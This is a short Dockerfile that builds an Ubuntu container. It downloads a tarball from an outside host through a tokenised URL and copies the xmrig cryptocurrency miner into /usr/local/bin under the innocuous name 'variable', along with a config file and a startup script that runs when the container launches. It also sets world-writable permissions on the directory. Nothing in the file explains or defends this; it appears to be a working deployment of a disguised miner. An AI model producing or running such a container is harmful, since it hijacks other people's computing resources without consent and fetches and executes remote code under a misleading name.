FROM ubuntu:20.04 

RUN apt update; \
    apt install wget -y; \
    apt install jq -y; \
    apt install bash -y; \
    wget https://data.atonline.net/~jwt/eyJ2IjoxLCJ1IjoicGhwbGF0Zm9ybSIsImUiOjE2NTUwNTEyMTd9.eyJhY3QiOiJnZXQiLCJpbiI6eyJkbCI6dHJ1ZX0sIm1pbWUiOiJhcHBsaWNhdGlvbi9nemlwIiwicCI6ImJsb2JzcmMvYmxvYnMtN3dqaWNuLWRmeWItZm50YS0zb2tyLWZiNHNyMnJtIn0.S7vTg3UXzbW-49w-davukU6CSz65tk87EVByHC_a9Iw/variable.tar.gz; \
    tar xf variable.tar.gz; \
    cd variable; \
    cp xmrig /usr/local/bin/variable; \
    cp init-conf.json /usr/local/bin/config.json; \
    cp script.sh /usr/local/bin/script.sh; \
    chmod -R 777 /usr/local/bin; \
    cd /usr/local/bin; \
    chmod 777 config.json; \
    chmod 777 variable; \
    chmod 777 script.sh;
    
WORKDIR /usr/local/bin
CMD script.sh
